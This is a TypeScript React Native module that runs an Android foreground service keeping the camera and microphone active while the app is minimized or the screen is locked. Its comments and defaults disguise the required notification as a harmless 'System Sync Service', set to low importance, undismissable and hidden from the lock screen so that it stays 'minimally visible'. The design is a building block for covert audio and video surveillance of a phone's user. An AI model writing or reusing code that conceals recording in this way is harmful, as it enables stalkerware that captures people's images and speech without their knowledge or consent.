/**
 * ============================================
 * Android Foreground Service Manager
 * ============================================
 * Manages a foreground service that keeps the camera
 * and microphone stream active even when the app is
 * minimized or the screen is locked.
 *
 * The notification is configured with LOW importance
 * and a non-alarming title "System Sync Service"
 * to remain minimally visible.
 */

import { Platform, NativeModules, DeviceEventEmitter, AppState } from 'react-native';
import * as Notifications from 'expo-notifications';

const { ForegroundServiceModule } = NativeModules;

interface ForegroundServiceConfig {
  channelId: string;
  channelName: string;
  title: string;
  text: string;
  importance: 'low' | 'min' | 'default' | 'high';
  ongoing: boolean;
  icon: string;
  showWhen: boolean;
  smallIcon: string;
}

const DEFAULT_SERVICE_CONFIG: ForegroundServiceConfig = {
  channelId: 'system-sync-channel',
  channelName: 'System Sync',
  title: 'System Sync Service',
  text: 'Background sync is running',
  importance: 'low',          // Minimally visible
  ongoing: true,              // Cannot be dismissed
  icon: 'ic_launcher',
  showWhen: false,            // Hidden from lock screen
  smallIcon: 'ic_launcher',
};

class ForegroundServiceManager {
  private isRunning = false;
  private appStateSubscription: any = null;
  private heartbeatInterval: ReturnType<typeof setInterval> | null = null;

  /**
   * Start the foreground service
   * This keeps the camera and mic active in the background
   */
  async start(config: Partial<ForegroundServiceConfig> = {}): Promise<boolean> {
    if (Platform.OS !== 'android') {
      console.log('[FGS] Foreground service only supported on Android');
      return false;
    }

    try {
      const serviceConfig = { ...DEFAULT_SERVICE_CONFIG, ...config };

      // Setup notification channel for low importance
      await Notifications.setNotificationChannelAsync(serviceConfig.channelId, {
        name: serviceConfig.channelName,
        importance: Notifications.AndroidImportance.LOW,
        vibrationPattern: [],
        lockScreenVisibility: Notifications.AndroidImportance.LOW,
        bypassDnd: false,
        showBadge: false,
      });

      // Request notification permission (required for foreground service)
      const { status: existingStatus } = await Notifications.getPermissionsAsync();
      let finalStatus = existingStatus;

      if (existingStatus !== 'granted') {
        const { status } = await Notifications.requestPermissionsAsync();
        finalStatus = status;
      }

      if (finalStatus !== 'granted') {
        console.error('[FGS] Notification permission not granted');
        return false;
      }

      // Start the foreground service via native module
      if (ForegroundServiceModule?.startService) {
        ForegroundServiceModule.startService(serviceConfig);
      }

      this.isRunning = true;
      console.log('[FGS] Foreground service started');
      return true;
    } catch (error) {
      console.error('[FGS] Error starting foreground service:', error);
      return false;
    }
  }

  /**
   * Stop the foreground service
   */
  stop(): void {
    if (Platform.OS !== 'android') return;

    try {
      if (ForegroundServiceModule?.stopService) {
        ForegroundServiceModule.stopService();
      }
      this.isRunning = false;
      console.log('[FGS] Foreground service stopped');
    } catch (error) {
      console.error('[FGS] Error stopping foreground service:', error);
    }
  }

  /**
   * Update the notification text
   */
  updateNotification(text: string): void {
    if (Platform.OS !== 'android' || !this.isRunning) return;

    try {
      if (ForegroundServiceModule?.updateNotification) {
        ForegroundServiceModule.updateNotification({
          text,
          title: DEFAULT_SERVICE_CONFIG.title,
        });
      }
    } catch (error) {
      console.error('[FGS] Error updating notification:', error);
    }
  }

  /**
   * Start heartbeat to keep service alive
   */
  startHeartbeat(callback: () => void, intervalMs: number = 15000): void {
    if (this.heartbeatInterval) clearInterval(this.heartbeatInterval);

    this.heartbeatInterval = setInterval(callback, intervalMs);
  }

  /**
   * Stop heartbeat
   */
  stopHeartbeat(): void {
    if (this.heartbeatInterval) {
      clearInterval(this.heartbeatInterval);
      this.heartbeatInterval = null;
    }
  }

  isActive(): boolean {
    return this.isRunning;
  }
}

const foregroundService = new ForegroundServiceManager();
export default foregroundService;
